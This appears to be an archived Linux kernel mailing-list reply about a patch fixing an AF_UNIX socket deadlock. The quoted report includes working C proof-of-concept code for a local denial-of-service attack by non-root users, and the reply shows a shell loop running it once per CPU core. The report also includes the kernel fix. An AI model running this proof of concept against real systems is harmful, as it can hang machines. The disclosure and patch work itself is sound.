Return-Path: <linux-kernel-owner+w=401wt.eu-S1751293AbZJSHCL@vger.kernel.org>
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
	id S1751293AbZJSHCL (ORCPT <rfc822;w@1wt.eu>);
	Mon, 19 Oct 2009 03:02:11 -0400
Received: (majordomo@vger.kernel.org) by vger.kernel.org id S1751534AbZJSHCK
	(ORCPT <rfc822;linux-kernel-outgoing>);
	Mon, 19 Oct 2009 03:02:10 -0400
Received: from mail-qy0-f202.google.com ([209.85.221.202]:55387 "EHLO
	mail-qy0-f202.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
	with ESMTP id S1750840AbZJSHCK convert rfc822-to-8bit (ORCPT
	<rfc822;linux-kernel@vger.kernel.org>);
	Mon, 19 Oct 2009 03:02:10 -0400
DomainKey-Signature: a=rsa-sha1; c=nofws;
        d=gmail.com; s=gamma;
        h=mime-version:in-reply-to:references:date:message-id:subject:from:to
         :cc:content-type:content-transfer-encoding;
        b=gihAwoERw8Al7l62xsIWJajfKNuY2YNRuVyuTFlkydmv1DDsu0qgLdrDpXzSHBy3fA
         RP2mRnFPoHDcaCOYtno1JQOE6z0qbpacN/n1w2OwThOh8qAqpf3CyVvuRZs5n/4ThueA
         IfT/EnlbOLfBw/L3wVVoCPJ4cDBX0b5gXRaMU=
MIME-Version: 1.0
In-Reply-To: <4ADC010C.5070809@hitachi.com>
References: <4ADC010C.5070809@hitachi.com>
Date: Mon, 19 Oct 2009 15:02:14 +0800
Message-ID: <2375c9f90910190002m372edafq9a4c95d754640487@mail.gmail.com>
Subject: Re: [PATCH] AF_UNIX: Fix deadlock on connecting to shutdown socket
From: =?UTF-8?Q?Am=C3=A9rico_Wang?= <xiyou.wangcong@gmail.com>
To: Tomoki Sekiyama <tomoki.sekiyama.qu@hitachi.com>
Cc: linux-kernel@vger.kernel.org, netdev@vger.kernel.org,
       alan@lxorguk.ukuu.org.uk, davem@davemloft.net,
       satoshi.oshima.fk@hitachi.com, hidehiro.kawai.ez@hitachi.com,
       hideo.aoki.tk@hitachi.com
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8BIT
Sender: linux-kernel-owner@vger.kernel.org
List-ID: <linux-kernel.vger.kernel.org>
X-Mailing-List: linux-kernel@vger.kernel.org

On Mon, Oct 19, 2009 at 2:02 PM, Tomoki Sekiyama
<tomoki.sekiyama.qu@hitachi.com> wrote:
> Hi,
> I found a deadlock bug in UNIX domain socket, which makes able to DoS
> attack against the local machine by non-root users.
>
> How to reproduce:
> 1. Make a listening AF_UNIX/SOCK_STREAM socket with an abstruct
>    namespace(*), and shutdown(2) it.
>  2. Repeat connect(2)ing to the listening socket from the other sockets
>    until the connection backlog is full-filled.
>  3. connect(2) takes the CPU forever. If every core is taken, the
>    system hangs.
>
> PoC code: (Run as many times as cores on SMP machines.)


Interesting...

I tried this with the following command:

% for i in `seq 1 $(grep processor -c /proc/cpuinfo)`;
do ./unix-socket-dos-exploit; echo "=====$i====";done
Connection OK
Connection OK
=====1====
Connection OK
Connection OK
=====2====
Connection OK
Connection OK
=====3====
Connection OK
Connection OK
=====4====

My system doesn't hang at all.

Am I missing something?

Thanks!

>
> int main(void)
> {
>        int ret;
>        int csd;
>        int lsd;
>        struct sockaddr_un sun;
>
>        /* make an abstruct name address (*) */
>        memset(&sun, 0, sizeof(sun));
>        sun.sun_family = PF_UNIX;
>        sprintf(&sun.sun_path[1], "%d", getpid());
>
>        /* create the listening socket and shutdown */
>        lsd = socket(AF_UNIX, SOCK_STREAM, 0);
>        bind(lsd, (struct sockaddr *)&sun, sizeof(sun));
>        listen(lsd, 1);
>        shutdown(lsd, SHUT_RDWR);
>
>        /* connect loop */
>        alarm(15); /* forcely exit the loop after 15 sec */
>        for (;;) {
>                csd = socket(AF_UNIX, SOCK_STREAM, 0);
>                ret = connect(csd, (struct sockaddr *)&sun, sizeof(sun));
>                if (-1 == ret) {
>                        perror("connect()");
>                        break;
>                }
>                puts("Connection OK");
>        }
>        return 0;
> }
>
> (*) Make sun_path[0] = 0 to use the abstruct namespace.
>    If a file-based socket is used, the system doesn't deadlock because
>    of context switches in the file system layer.
>
> Why this happens:
>  Error checks between unix_socket_connect() and unix_wait_for_peer() are
>  inconsistent. The former calls the latter to wait until the backlog is
>  processed. Despite the latter returns without doing anything when the
>  socket is shutdown, the former doesn't check the shutdown state and
>  just retries calling the latter forever.
>
> Patch:
>  The patch below adds shutdown check into unix_socket_connect(), so
>  connect(2) to the shutdown socket will return -ECONREFUSED.
>
> Signed-off-by: Tomoki Sekiyama <tomoki.sekiyama.qu@hitachi.com>
> Signed-off-by: Masanori Yoshida <masanori.yoshida.tv@hitachi.com>
> ---
>  net/unix/af_unix.c |    2 ++
>  1 files changed, 2 insertions(+), 0 deletions(-)
>
> diff --git a/net/unix/af_unix.c b/net/unix/af_unix.c
> index 51ab497..fc820cd 100644
> --- a/net/unix/af_unix.c
> +++ b/net/unix/af_unix.c
> @@ -1074,6 +1074,8 @@ restart:
>        err = -ECONNREFUSED;
>        if (other->sk_state != TCP_LISTEN)
>                goto out_unlock;
> +       if (other->sk_shutdown & RCV_SHUTDOWN)
> +               goto out_unlock;
>
>        if (unix_recvq_full(other)) {
>                err = -EAGAIN;
